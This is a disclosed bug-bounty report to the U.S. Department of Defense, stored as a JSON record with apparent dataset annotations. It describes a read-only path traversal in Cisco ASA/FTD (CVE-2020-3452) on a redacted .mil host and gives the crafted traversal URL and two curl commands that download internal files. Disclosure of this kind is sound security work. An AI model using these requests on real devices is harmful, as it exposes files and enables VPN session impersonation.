{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "raginalstorm ",
  "title": "Read-only path traversal (CVE-2020-3452)  at https://██████.mil",
  "content": "\nSummary:\nI discovered a vulnerability Read-only path traversal (CVE-2020-3452) at https://██████████.mil\nDescription:\nA vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device.\nImpact\nAn attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. As an example, this could allow an attacker to impersonate another VPN user and establish a Clientless SSL VPN or AnyConnect VPN session to the device as that user. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.\nStep-by-step Reproduction Instructions\nIn a web browser, navigate to https://██████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\nOnce URL is fully loaded, you will be prompted to download file translation-table that represents portal_inc.lua which you can then open and observe its content.\n██████████\n███████\nAlternatively, you can execute the below linux bash terminal command to download that same file portal_inc.lua:\nCode 157 Bytes\n1curl -k \"https://██████████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" --output portal_inc.lua \nYou can download various internal files using curl flag --output to output the binary data to a file:\nCode 148 Bytes\n1curl -k \"https://█████████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../\" --output session.js \nProduct, Version, and Configuration (If applicable)\nWebApp endpoint\nSuggested Mitigation/Remediation Actions\nCisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.\nThis advisory is available at the following link https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\nImpact\nAn attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. As an example, this could allow an attacker to impersonate another VPN user and establish a Clientless SSL VPN or AnyConnect VPN session to the device as that user. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1617403320,
  "report_url": "https://hackerone.com/reports/962908",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to https://██████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ in a web browser"
    ],
    [
      2,
      "Download the file translation-table which contains the content of portal_inc.lua"
    ]
  ],
  "vuln_description": "A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software allows an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system due to improper input validation of URLs in HTTP requests.",
  "reason": "The attack involves a straightforward directory traversal technique using a crafted URL, which is a well-known and commonly exploited vulnerability pattern. The steps to reproduce are simple and do not require complex interactions or state manipulations.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}